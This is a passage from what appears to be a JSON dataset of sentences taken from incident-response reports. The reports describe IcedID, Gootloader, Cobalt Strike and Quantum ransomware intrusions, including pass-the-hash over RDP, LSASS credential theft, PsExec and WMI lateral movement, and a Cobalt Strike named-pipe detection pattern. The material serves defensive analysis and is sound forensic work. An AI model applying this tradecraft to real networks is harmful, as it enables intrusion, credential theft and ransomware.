        "id": "dfir-reports-filtered/r-dfir-14.md:::S95",
        "text": "While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.",
        "type": "",
        "report": "r-dfir-14",
        "line": 95,
        "index": 5239
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S96",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 96,
        "index": 5240
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S97",
        "text": "On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 97,
        "index": 5241
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S98",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 98,
        "index": 5242
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S99",
        "text": "As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons.",
        "type": "",
        "report": "r-dfir-14",
        "line": 99,
        "index": 5243
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S100",
        "text": "This method was used to pivot to other systems within the network.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 100,
        "index": 5244
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S101",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 101,
        "index": 5245
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S102",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 102,
        "index": 5246
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S103",
        "text": "SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 103,
        "index": 5247
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S104",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 104,
        "index": 5248
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S105",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 105,
        "index": 5249
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S106",
        "text": "These executables were then executed by a remote service visible in the windows event id 7045 logs.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 106,
        "index": 5250
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S107",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 107,
        "index": 5251
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S108",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 108,
        "index": 5252
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S109",
        "text": "Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network.",
        "type": "",
        "report": "r-dfir-14",
        "line": 109,
        "index": 5253
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S110",
        "text": "One important aspect of these sessions is that the threat actor authenticated using \u201cRestricted Admin Mode\u201d.",
        "type": "",
        "report": "r-dfir-14",
        "line": 110,
        "index": 5254
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S111",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 111,
        "index": 5255
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S112",
        "text": "Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP.",
        "type": "",
        "report": "r-dfir-14",
        "line": 112,
        "index": 5256
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S113",
        "text": "In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 113,
        "index": 5257
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S114",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 114,
        "index": 5258
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S115",
        "text": "The threat actor attempted to use both Invoke-WMIExec and psexec to enable \u201cRestricted Admin Mode\u201d.",
        "type": "",
        "report": "r-dfir-14",
        "line": 115,
        "index": 5259
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S116",
        "text": "The logon information of EventID 4624 includes a field \u201cRestricted Admin Mode\u201d, which is set to the value \u201cYes\u201d if the feature is used.",
        "type": "",
        "report": "r-dfir-14",
        "line": 116,
        "index": 5260
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S117",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 117,
        "index": 5261
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S118",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 118,
        "index": 5262
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S119",
        "text": "The threat actor accessed multiple files during the RDP sessions on multiple servers.",
        "type": "",
        "report": "r-dfir-14",
        "line": 119,
        "index": 5263
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S120",
        "text": "In one instance document files were opened directly on the system.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 120,
        "index": 5264
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S121",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 121,
        "index": 5265
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S122",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 122,
        "index": 5266
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S123",
        "text": "Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.",
        "type": "",
        "report": "r-dfir-14",
        "line": 123,
        "index": 5267
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S124",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 124,
        "index": 5268
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S125",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 125,
        "index": 5269
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S126",
        "text": "Gootloader second stage download URLs.",
        "type": "",
        "report": "r-dfir-14",
        "line": 126,
        "index": 5270
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S127",
        "text": "These URLs were deobfuscated and extracted using this script by HP Threat Research.",
        "type": "",
        "report": "r-dfir-14",
        "line": 127,
        "index": 5271
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S128",
        "text": "They\u2019ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 128,
        "index": 5272
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S129",
        "text": "In this case, there was no further impact to the environment before the threat actors were evicted.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 129,
        "index": 5273
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S0",
        "text": "The threat actor was able to enter the network when a user endpoint was compromised by an IcedID payload contained within an ISO image.",
        "type": "",
        "report": "r-dfir-15",
        "line": 0,
        "index": 5274
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S1",
        "text": "We have high confidence this payload was delivered via email, however we were not able to identify the delivery email.",
        "type": "",
        "report": "r-dfir-15",
        "line": 1,
        "index": 5275
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S2",
        "text": "The ISO contained a DLL file (IcedID malware) and a LNK shortcut to execute it.",
        "type": "",
        "report": "r-dfir-15",
        "line": 2,
        "index": 5276
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S3",
        "text": "The end user after clicking into the ISO file, could see just a single file named \u201cdocument\u201d, which is a LNK shortcut to a hidden DLL packaged in the ISO.",
        "type": "",
        "report": "r-dfir-15",
        "line": 3,
        "index": 5277
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S4",
        "text": "When the user clicks on the LNK file, the IcedID DLL is executed.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 4,
        "index": 5278
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S5",
        "text": "Upon this execution of the IcedID DLL, a battery of discovery tasks were executed using built-in Windows utilities like ipconfig, systeminfo, nltest, net, and chcp.",
        "type": "",
        "report": "r-dfir-15",
        "line": 5,
        "index": 5279
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S6",
        "text": "The IcedID malware also created a scheduled task as a means of persistence on the beachhead host.",
        "type": "",
        "report": "r-dfir-15",
        "line": 6,
        "index": 5280
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S7",
        "text": "Around two hours later, Cobalt Strike was deployed using process hollowing and injection techniques.",
        "type": "",
        "report": "r-dfir-15",
        "line": 7,
        "index": 5281
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S8",
        "text": "This marked the start of \u201chands-on-keyboard\u201d activity by the threat actors.",
        "type": "",
        "report": "r-dfir-15",
        "line": 8,
        "index": 5282
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S9",
        "text": "This activity included using AdFind through a batch script called adfind.bat to perform discovery of the target organizations active directory structure.",
        "type": "",
        "report": "r-dfir-15",
        "line": 9,
        "index": 5283
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S10",
        "text": "The threat actors gathered host based network information by running a batch script named ns.bat , which ran nslookup for each host in the environment.",
        "type": "",
        "report": "r-dfir-15",
        "line": 10,
        "index": 5284
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S11",
        "text": "The Cobalt Strike process then proceeded to access LSASS memory to extract credentials, which a few minutes later were tested to run remote WMI discovery tasks on a server.",
        "type": "",
        "report": "r-dfir-15",
        "line": 11,
        "index": 5285
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S12",
        "text": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
        "type": "",
        "report": "r-dfir-15",
        "line": 12,
        "index": 5286
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S13",
        "text": "This appeared to fail so the threat actor then opened cmd and proceeded to execute a PowerShell Cobalt Strike Beacon.",
        "type": "",
        "report": "r-dfir-15",
        "line": 13,
        "index": 5287
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S14",
        "text": "This Beacon was successful in connecting to the same command and control server observed on the beachhead host.",
        "type": "",
        "report": "r-dfir-15",
        "line": 14,
        "index": 5288
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S15",
        "text": "For the next hour, the threat actor proceeded to make RDP connections to other servers in the environment.",
        "type": "",
        "report": "r-dfir-15",
        "line": 15,
        "index": 5289
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S16",
        "text": "Once the threat actor had a handle on the layout of the domain, they prepared to deploy the ransomware by copying the ransomware (named ttsel.exe ) to each host through the C$ share folder.",
        "type": "",
        "report": "r-dfir-15",
        "line": 16,
        "index": 5290
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S17",
        "text": "They used two methods of remote execution to detonate the ransomware binary, WMI and PsExec.",
        "type": "",
        "report": "r-dfir-15",
        "line": 17,
        "index": 5291
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S18",
        "text": "This ransomware deployment concluded less than four hours from the initial IcedID execution.",
        "type": "",
        "report": "r-dfir-15",
        "line": 18,
        "index": 5292
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S19",
        "text": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "type": "",
        "report": "r-dfir-15",
        "line": 19,
        "index": 5293
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S20",
        "text": "The threat actor gained initial access through the common malware, IcedID.",
        "type": "",
        "report": "r-dfir-15",
        "line": 20,
        "index": 5294
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S21",
        "text": "The payload was delivered within an ISO file, docs_invoice_173.iso , via email, where a user opened and executed the malware.",
        "type": "",
        "report": "r-dfir-15",
        "line": 21,
        "index": 5295
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S22",
        "text": "Shout out to @k3dg3 for making these ISOs available.",
        "type": "",
        "report": "r-dfir-15",
        "line": 22,
        "index": 5296
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S23",
        "text": "We were able to determine the user mounted the ISO using the Event ID 12 in Microsoft-Windows-VHDMP-Operational.evtx as shown below:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 23,
        "index": 5297
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S24",
        "text": "When mounted, the ISO contained two files:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 24,
        "index": 5298
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S25",
        "text": "Typical end user perspective after opening the ISO file:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 25,
        "index": 5299
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S26",
        "text": "The file document.lnk is a shortcut or lnk file and dar.dll was the IcedID payload.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 26,
        "index": 5300
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S27",
        "text": "A quick look at document.lnk \u2018s properties highlight the command line that is executed on launch:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 27,
        "index": 5301
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S28",
        "text": "But we can do a lot better than that with a .lnk file!",
        "type": "",
        "report": "r-dfir-15",
        "line": 28,
        "index": 5302
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S29",
        "text": "These .lnk files provide a wealth of knowledge to investigators.",
        "type": "",
        "report": "r-dfir-15",
        "line": 29,
        "index": 5303
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S30",
        "text": "For example, below is a partial output of the tool LECmd.exe (by Eric Zimmerman).",
        "type": "",
        "report": "r-dfir-15",
        "line": 30,
        "index": 5304
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S31",
        "text": "When used on the file document.lnk , it parses out metadata such as when the shortcut file was made, what hostname and the MAC Address of the device it was created on and even the directory path of the user that created it!",
        "type": "",
        "report": "r-dfir-15",
        "line": 31,
        "index": 5305
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S32",
        "text": "We were able to determine when the user clicked on the lnk file and when a new process was created with the command line mentioned above.",
        "type": "",
        "report": "r-dfir-15",
        "line": 32,
        "index": 5306
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S33",
        "text": "Furthermore, the Event ID 4663 in Security.evtx highlighted when explorer.exe accessed document.lnk :\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 33,
        "index": 5307
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S34",
        "text": "Additionally, the context of execution location and parent process can also be used to follow the user execution process.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 34,
        "index": 5308
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S35",
        "text": "Shortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 35,
        "index": 5309
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S36",
        "text": "This included an instance of C:\\Windows\\SysWOW64\\cmd.exe , which the IcedID malware used to hollow out and then inject a Cobalt Strike beacon into.",
        "type": "",
        "report": "r-dfir-15",
        "line": 36,
        "index": 5310
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S37",
        "text": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "type": "",
        "report": "r-dfir-15",
        "line": 37,
        "index": 5311
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S38",
        "text": "The cmd.exe process spawned a suspicious instance of rundll32.exe .",
        "type": "",
        "report": "r-dfir-15",
        "line": 38,
        "index": 5312
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S39",
        "text": "There were no command line arguments for this process which is atypical for rundll32.exe.",
        "type": "",
        "report": "r-dfir-15",
        "line": 39,
        "index": 5313
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S40",
        "text": "A further indication was the rundll32.exe process creating a named pipe, postex_304a.",
        "type": "",
        "report": "r-dfir-15",
        "line": 40,
        "index": 5314
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S41",
        "text": "This behavior of rundll32.exe and a named pipe that matches postex_[0-9a-f]{4} , is the default behavior used by Cobalt Strike 4.2+ post exploitation jobs.",
        "type": "",
        "report": "r-dfir-15",
        "line": 41,
        "index": 5315
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S42",
        "text": "For more information on Cobalt Strike, you can read our article Cobalt Strike, a Defender\u2019s Guide.",
        "type": "",
        "report": "r-dfir-15",
        "line": 42,
        "index": 5316
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S43",
        "text": "When we reviewed the memory of this process, we were able to confirm it was in fact Cobalt Strike when we successfully extracted the beacon configuration (additional details can be found in the Command and Control section).",
        "type": "",
        "report": "r-dfir-15",
        "line": 43,
        "index": 5317
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S44",
        "text": "The threat actor also executed a PowerShell Cobalt Strike payload on some servers:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 44,
        "index": 5318
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S45",
        "text": "This payload is using the default Cobalt Strike obfuscation scheme (XOR 35), and can easily be decoded using CyberChef:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 45,
        "index": 5319
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S46",
        "text": "The output can be analyzed using scdbg to highlight what Windows API calls the shellcode makes:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 46,
        "index": 5320
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S47",
        "text": "Prior to using the PowerShell beacon the threat actor dropped a DLL beacon on the server (p227.dll), but this appears to have failed for unknown reasons after which, the threat actor moved on to the PowerShell beacon which executed successfully.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 47,
        "index": 5321
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S48",
        "text": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "type": "",
        "report": "r-dfir-15",
        "line": 48,
        "index": 5322
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S49",
        "text": "The task \\kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} was created with the execution action below:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 49,
        "index": 5323
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S50",
        "text": "Process injection was observed during the intrusion by both IcedID and Cobalt Strike.",
        "type": "",
        "report": "r-dfir-15",
        "line": 50,
        "index": 5324
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S51",
        "text": "On one system, the threat actor injected into the winlogon process.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 51,
        "index": 5325
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S52",
        "text": "Cobalt Strike Processes Identified by in Memory Yara Scanning.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 52,
        "index": 5326
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S53",
        "text": "Volatility Malfind output shows the embedded MZ header in the winlogon process with the setting PAGE_EXECUTE_READWRITE protection settings on the memory space, a commonly observed attribute of process injection.",
        "type": "",
        "report": "r-dfir-15",
        "line": 53,
        "index": 5327
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S54",
        "text": "Network connections to the Cobalt Strike server by winlogon were also observed in the process logs.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 54,
        "index": 5328
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S55",
        "text": "Suspicious accesses to LSASS process memory were observed during this intrusion.",
        "type": "",
        "report": "r-dfir-15",
        "line": 55,
        "index": 5329
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S56",
        "text": "As illustrated below, those accesses have been made using both Windows Task Manager and rundll32.exe which is assessed to be a Cobalt Strike temporary beacon (as shown in the Execution graph):\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 56,
        "index": 5330
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S57",
        "text": "The threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 57,
        "index": 5331
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S58",
        "text": "As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor.",
        "type": "",
        "report": "r-dfir-15",
        "line": 58,
        "index": 5332
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S59",
        "text": "Given the timing of these commands were immediately after the execution of IcedID, we believe these commands were executed automatically upon check-in.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 59,
        "index": 5333
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S60",
        "text": "A cmd.exe process spawned from IcedID which ran additional discovery queries.",
        "type": "",
        "report": "r-dfir-15",
        "line": 60,
        "index": 5334
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S61",
        "text": "The threat actor dropped the following files in C:\\Windows\\Temp directory:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 61,
        "index": 5335
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S62",
        "text": "The actor used the Active Directory enumeration tool AdFind to collect information such as the users, computers and subnets in the domain.",
        "type": "",
        "report": "r-dfir-15",
        "line": 62,
        "index": 5336
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S63",
        "text": "The file ad.7z , was the resulting output of the AdFind commands above.",
        "type": "",
        "report": "r-dfir-15",
        "line": 63,
        "index": 5337
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S64",
        "text": "After that, an additional batch script was created, ns.bat , which enumerated all host names in the domain with nslookup to identify the IP address of the host.",
        "type": "",
        "report": "r-dfir-15",
        "line": 64,
        "index": 5338
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S65",
        "text": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 65,
        "index": 5339
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S66",
        "text": "The threat actor used RDP to move laterally to critical hosts.",
        "type": "",
        "report": "r-dfir-15",
        "line": 66,
        "index": 5340
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S67",
        "text": "In particular, we have evidence on multiple machines of RDP using the Administrator account.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 67,
        "index": 5341
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S68",
        "text": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
        "type": "",
        "report": "r-dfir-15",
        "line": 68,
        "index": 5342
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S69",
        "text": "See the screenshot below:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 69,
        "index": 5343
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S70",
        "text": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 70,
        "index": 5344
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S71",
        "text": "PsExec was used to facilitate the ransomware execution.",
        "type": "",
        "report": "r-dfir-15",
        "line": 71,
        "index": 5345
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S72",
        "text": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name ( mstdc ) of the remote service created on the target host (by default it\u2019s PSEXESVC).\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 72,
        "index": 5346
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S73",
        "text": "Through-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload.",
        "type": "",
        "report": "r-dfir-15",
        "line": 73,
        "index": 5347
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S74",
        "text": "The WMIC commands prefaced with /node:IP Address allowed the threat actor to run commands on remote hosts.",
        "type": "",
        "report": "r-dfir-15",
        "line": 74,
        "index": 5348
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S75",
        "text": "As we saw from the execution section, dar.dll was used to contact the below domains:\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 75,
        "index": 5349
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S76",
        "text": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "type": "",
        "report": "r-dfir-15",
        "line": 76,
        "index": 5350
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S77",
        "text": "Just shy of four hours into the intrusion, the threat actors began acting on their final objectives, domain wide ransomware deployment.",
        "type": "",
        "report": "r-dfir-15",
        "line": 77,
        "index": 5351
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S78",
        "text": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 78,
        "index": 5352
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S79",
        "text": "They first copied the payload, ttsel.exe , to the C$ share of each host on the network.",
        "type": "",
        "report": "r-dfir-15",
        "line": 79,
        "index": 5353
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S80",
        "text": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name (\u201cmstdc\u201d) of the remote service created on the target host (by default is PSEXESVC).",
        "type": "",
        "report": "r-dfir-15",
        "line": 80,
        "index": 5354
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S81",
        "text": "This resulted in the file C:\\Windows\\mstdc.exe being created on the target endpoint when PsExec was executed.",
        "type": "",
        "report": "r-dfir-15",
        "line": 81,
        "index": 5355
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S82",
        "text": "The alternate execution method the actor employed was a WMI call to start a remote process on the target host.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 82,
        "index": 5356
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S83",
        "text": "The Quantum ransomware began to encrypt files across all hosts in the environment which then dropped the following ransom note: README_TO_DECRYPT.html\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 83,
        "index": 5357
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S84",
        "text": "The Quantum portal had a unique option to create and set a password to the negotiation chat.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 84,
        "index": 5358
    },
    {
        "id": "dfir-reports-filtered/r-dfir-15.md:::S85",
        "text": "Once authenticated, it displays the chat window with the threat actor.\n",
        "type": "",
        "report": "r-dfir-15",
        "line": 85,
        "index": 5359
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S0",
        "text": "We assess with high confidence that the \u201cStolen Image Evidence\u201d email campaign was used to deliver the IcedID DLL.",
        "type": "",
        "report": "r-dfir-16",
        "line": 0,
        "index": 5360
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S1",
        "text": "This was first reported by Microsoft in April 2021.",
        "type": "",
        "report": "r-dfir-16",
        "line": 1,
        "index": 5361
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S2",
        "text": "Upon execution of the IcedID DLL, a connection to a C2 server was established.",
        "type": "",
        "report": "r-dfir-16",
        "line": 2,
        "index": 5362
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S3",
        "text": "This was followed by the creation of a scheduled task on the beachhead host to establish persistence.",
        "type": "",
        "report": "r-dfir-16",
        "line": 3,
        "index": 5363
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S4",
        "text": "The task executed the IcedID payload every one 1 hour.",
        "type": "",
        "report": "r-dfir-16",
        "line": 4,
        "index": 5364
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S5",
        "text": "The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.",
        "type": "",
        "report": "r-dfir-16",
        "line": 5,
        "index": 5365
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S6",
        "text": "After a gap of almost an hour, a Cobalt Strike beacon was dropped and executed on the beachhead host.",
        "type": "",
        "report": "r-dfir-16",
        "line": 6,
        "index": 5366
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S7",
        "text": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
        "type": "",
        "report": "r-dfir-16",
        "line": 7,
        "index": 5367
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S8",
